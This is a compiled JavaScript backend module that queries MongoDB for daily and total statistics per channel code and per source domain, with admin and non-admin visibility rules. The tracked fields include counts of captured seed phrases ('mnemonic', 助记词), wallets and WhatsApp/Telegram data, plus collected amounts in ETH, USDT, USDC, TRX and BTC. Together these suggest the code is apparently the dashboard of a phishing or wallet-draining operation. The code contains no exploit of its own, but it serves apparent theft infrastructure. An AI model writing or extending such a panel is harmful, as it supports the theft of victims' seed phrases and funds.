import { Channel, ChannelDailyStats, ChannelDomainDailyStats, ChannelDomainTotalStats, ChannelTotalStats, } from '../db/models/index.js';
import { formatShanghaiDate, previousShanghaiDate } from './date.js';
import { normalizeChannelStatsSortField } from './sort.js';
import { isAdminLike } from '../auth/permissions.js';
import { COLLECT_KEYS, DATA_TYPE_KEYS, } from './types.js';
const DATA_TYPE_LABELS = {
    whatsapp: 'WS',
    telegram: 'TG',
    mnemonic: '助记词',
    wallet: '钱包',
};
const COLLECT_LABELS = {
    eth_native: 'ETH',
    eth_usdt: 'USDT(ETH)',
    eth_usdc: 'USDC(ETH)',
    tron_native: 'TRX',
    tron_usdt: 'USDT(TRON)',
    btc_native: 'BTC',
};
const CHAIN_TO_COLLECT_KEYS = {
    eth: ['eth_native', 'eth_usdt', 'eth_usdc'],
    tron: ['tron_native', 'tron_usdt'],
    btc: ['btc_native'],
};
export class ChannelStatsAccessError extends Error {
}
const SORT_FIELD_TO_DB_PATH = {
    visitsTotal: 'visitsTotal',
    devicesTotal: 'devicesTotal',
    'dataCounts.whatsapp.total': 'dataCountsTotal.whatsapp',
    'dataCounts.telegram.total': 'dataCountsTotal.telegram',
    'dataCounts.mnemonic.total': 'dataCountsTotal.mnemonic',
    'dataCounts.wallet.total': 'dataCountsTotal.wallet',
    'collect.eth_native': 'collectAmountTotal.eth_native',
    'collect.eth_usdt': 'collectAmountTotal.eth_usdt',
    'collect.eth_usdc': 'collectAmountTotal.eth_usdc',
    'collect.tron_native': 'collectAmountTotal.tron_native',
    'collect.tron_usdt': 'collectAmountTotal.tron_usdt',
    'collect.btc_native': 'collectAmountTotal.btc_native',
    'collectAmount.eth_native.total': 'collectAmountTotal.eth_native',
    'collectAmount.eth_usdt.total': 'collectAmountTotal.eth_usdt',
    'collectAmount.eth_usdc.total': 'collectAmountTotal.eth_usdc',
    'collectAmount.tron_native.total': 'collectAmountTotal.tron_native',
    'collectAmount.tron_usdt.total': 'collectAmountTotal.tron_usdt',
    'collectAmount.btc_native.total': 'collectAmountTotal.btc_native',
};
function asNumber(value) {
    const parsed = Number(value ?? 0);
    return Number.isFinite(parsed) ? parsed : 0;
}
function formatTimestamp(value) {
    if (!value)
        return null;
    const date = value instanceof Date ? value : new Date(value);
    return Number.isNaN(date.getTime()) ? null : date.toISOString();
}
function buildValue(total, current, previous) {
    return {
        total: asNumber(total),
        current: asNumber(current),
        previous: asNumber(previous),
    };
}
function getVisibleDataTypes(request) {
    if (isAdminLike(request.user?.role))
        return [...DATA_TYPE_KEYS];
    const socialTypes = new Set(request.user?.visibleSocialTypes || []);
    const result = [];
    if (socialTypes.has('whatsapp'))
        result.push('whatsapp');
    if (socialTypes.has('telegram'))
        result.push('telegram');
    result.push('wallet');
    return result;
}
function getVisibleCollectKeys(request) {
    if (isAdminLike(request.user?.role))
        return [...COLLECT_KEYS];
    const visibleChains = request.user?.visibleChains || [];
    const seen = new Set();
    const keys = [];
    for (const chain of visibleChains) {
        for (const key of CHAIN_TO_COLLECT_KEYS[chain] || []) {
            if (seen.has(key))
                continue;
            seen.add(key);
            keys.push(key);
        }
    }
    return keys;
}
function buildColumns(dataTypes, collectKeys) {
    return {
        dataTypes: dataTypes.map((key) => ({ key, label: DATA_TYPE_LABELS[key] })),
        collectKeys: collectKeys.map((key) => ({ key, label: COLLECT_LABELS[key] })),
    };
}
function emptyRow(channelCode, channelName, sourceDomain) {
    return {
        channelCode,
        channelName,
        sourceDomain,
        visitsTotal: 0,
        visitsCurrent: 0,
        visitsPrevious: 0,
        devicesTotal: 0,
        devicesCurrent: 0,
        devicesPrevious: 0,
        dataCounts: {},
        collectAmount: {},
    };
}
function normalizeChannelCodes(codes) {
    if (!Array.isArray(codes))
        return [];
    const seen = new Set();
    const result = [];
    for (const code of codes) {
        const normalized = typeof code === 'string' ? code.trim() : '';
        if (!normalized || seen.has(normalized))
            continue;
        seen.add(normalized);
        result.push(normalized);
    }
    return result;
}
function extractAllowedChannelCodes(request) {
    if (isAdminLike(request.user?.role))
        return null;
    const userCodes = normalizeChannelCodes(request.user?.channelCodes);
    const filterCodes = normalizeChannelCodes(request.channelFilter?.channelCode?.$in);
    if (userCodes.length === 0)
        return filterCodes;
    if (filterCodes.length === 0)
        return userCodes;
    const filterCodeSet = new Set(filterCodes);
    return userCodes.filter(code => filterCodeSet.has(code));
}
function buildChannelLookupFilter(request) {
    const allowedCodes = extractAllowedChannelCodes(request);
    if (allowedCodes == null)
        return {};
    return { code: { $in: allowedCodes } };
}
function buildStatsFilter(request) {
    const allowedCodes = extractAllowedChannelCodes(request);
    if (allowedCodes == null)
        return {};
    return { channelCode: { $in: allowedCodes } };
}
function buildMongoSort(sortField, sortOrder, tieBreakerField) {
    const normalizedSortField = normalizeChannelStatsSortField(sortField);
    const path = SORT_FIELD_TO_DB_PATH[normalizedSortField] || 'visitsTotal';
    const direction = sortOrder === 'asc' ? 1 : -1;
    return {
        [path]: direction,
        [tieBreakerField]: 1,
    };
}
function pickLatestTimestamp(rows) {
    let latest = null;
    for (const row of rows) {
        if (!(row.refreshedAt instanceof Date))
            continue;
        if (!latest || row.refreshedAt.getTime() > latest.getTime())
            latest = row.refreshedAt;
    }
    return latest ? latest.toISOString() : null;
}
function buildDataCounts(totalMap, currentMap, previousMap, visibleDataTypes) {
    const result = {};
    for (const key of visibleDataTypes) {
        result[key] = buildValue(totalMap?.[key], currentMap?.[key], previousMap?.[key]);
    }
    return result;
}
function buildCollectAmount(totalMap, currentMap, previousMap, visibleCollectKeys) {
    const result = {};
    for (const key of visibleCollectKeys) {
        result[key] = buildValue(totalMap?.[key], currentMap?.[key], previousMap?.[key]);
    }
    return result;
}
function mergeChannelRow(baseRow, currentDaily, previousDaily, totalStats, visibleDataTypes, visibleCollectKeys) {
    return {
        ...baseRow,
        visitsTotal: asNumber(totalStats?.visitsTotal),
        visitsCurrent: asNumber(currentDaily?.visits),
        visitsPrevious: asNumber(previousDaily?.visits),
        devicesTotal: asNumber(totalStats?.devicesTotal),
        devicesCurrent: asNumber(currentDaily?.newDevices),
        devicesPrevious: asNumber(previousDaily?.newDevices),
        dataCounts: buildDataCounts(totalStats?.dataCountsTotal, currentDaily?.dataCounts, previousDaily?.dataCounts, visibleDataTypes),
        collectAmount: buildCollectAmount(totalStats?.collectAmountTotal, currentDaily?.collectAmount, previousDaily?.collectAmount, visibleCollectKeys),
    };
}
async function getChannelRows(request, date, previousDate, query) {
    const visibleDataTypes = getVisibleDataTypes(request);
    const visibleCollectKeys = getVisibleCollectKeys(request);
    const statsFilter = buildStatsFilter(request);
    const [totalRows, total] = await Promise.all([
        ChannelTotalStats.find(statsFilter)
            .sort(buildMongoSort(query.sortField, query.sortOrder, 'channelCode'))
            .skip((query.page - 1) * query.pageSize)
            .limit(query.pageSize)
            .lean(),
        ChannelTotalStats.countDocuments(statsFilter).exec(),
    ]);
    if (total === 0 || totalRows.length === 0) {
        return { rows: [], refreshedAt: null, total };
    }
    const channelCodes = totalRows.map((row) => String(row.channelCode || '').trim()).filter(Boolean);
    const channelFilter = channelCodes.length > 0 ? { code: { $in: channelCodes } } : { code: { $in: [] } };
    const [channels, currentRows, previousRows] = await Promise.all([
        Channel.find(channelFilter, { code: 1, name: 1, _id: 0 }).lean(),
        ChannelDailyStats.find({ date, channelCode: { $in: channelCodes } }).lean(),
        ChannelDailyStats.find({ date: previousDate, channelCode: { $in: channelCodes } }).lean(),
    ]);
    const currentByCode = new Map(currentRows.map((row) => [row.channelCode, row]));
    const previousByCode = new Map(previousRows.map((row) => [row.channelCode, row]));
    const totalByCode = new Map(totalRows.map((row) => [row.channelCode, row]));
    const channelNameByCode = new Map(channels.map((channel) => [channel.code, channel.name || channel.code]));
    const rows = channelCodes.map((channelCode) => mergeChannelRow(emptyRow(channelCode, channelNameByCode.get(channelCode) || channelCode), currentByCode.get(channelCode), previousByCode.get(channelCode), totalByCode.get(channelCode), visibleDataTypes, visibleCollectKeys));
    return { rows, refreshedAt: pickLatestTimestamp(currentRows), total };
}
async function getDomainRows(request, date, previousDate, channelCode, query) {
    const normalizedChannelCode = channelCode.trim();
    const allowedCodes = extractAllowedChannelCodes(request);
    if (!isAdminLike(request.user?.role) && (!allowedCodes || !allowedCodes.includes(normalizedChannelCode))) {
        throw new ChannelStatsAccessError('Forbidden');
    }
    const visibleDataTypes = getVisibleDataTypes(request);
    const visibleCollectKeys = getVisibleCollectKeys(request);
    const channel = await Channel.findOne({ code: normalizedChannelCode }, { code: 1, name: 1, _id: 0 }).lean();
    const channelName = typeof channel?.name === 'string' && channel.name.trim() ? channel.name.trim() : normalizedChannelCode;
    const domainFilter = { channelCode: normalizedChannelCode };
    const [totalRows, total] = await Promise.all([
        ChannelDomainTotalStats.find(domainFilter)
            .sort(buildMongoSort(query.sortField, query.sortOrder, 'sourceDomain'))
            .skip((query.page - 1) * query.pageSize)
            .limit(query.pageSize)
            .lean(),
        ChannelDomainTotalStats.countDocuments(domainFilter).exec(),
    ]);
    if (total === 0 || totalRows.length === 0) {
        return { rows: [], refreshedAt: null, total };
    }
    const sourceDomains = totalRows.map((row) => String(row.sourceDomain || '')).filter(Boolean);
    const [currentRows, previousRows] = await Promise.all([
        ChannelDomainDailyStats.find({ date, channelCode: normalizedChannelCode, sourceDomain: { $in: sourceDomains } }).lean(),
        ChannelDomainDailyStats.find({ date: previousDate, channelCode: normalizedChannelCode, sourceDomain: { $in: sourceDomains } }).lean(),
    ]);
    const currentByDomain = new Map(currentRows.map((row) => [row.sourceDomain, row]));
    const previousByDomain = new Map(previousRows.map((row) => [row.sourceDomain, row]));
    const totalByDomain = new Map(totalRows.map((row) => [row.sourceDomain, row]));
    const rows = sourceDomains.map((sourceDomain) => mergeChannelRow(emptyRow(normalizedChannelCode, channelName, sourceDomain), currentByDomain.get(sourceDomain), previousByDomain.get(sourceDomain), totalByDomain.get(sourceDomain), visibleDataTypes, visibleCollectKeys));
    return { rows, refreshedAt: pickLatestTimestamp(currentRows), total };
}
export async function getChannelStatsPage(request, query) {
    const date = query.date || formatShanghaiDate(new Date());
    const previousDate = previousShanghaiDate(date);
    const columns = buildColumns(getVisibleDataTypes(request), getVisibleCollectKeys(request));
    const resolved = query.channelCode
        ? await getDomainRows(request, date, previousDate, query.channelCode, query)
        : await getChannelRows(request, date, previousDate, query);
    return {
        date,
        previousDate,
        refreshedAt: resolved.refreshedAt,
        columns,
        items: resolved.rows,
        total: resolved.total,
    };
}
//# sourceMappingURL=query.js.map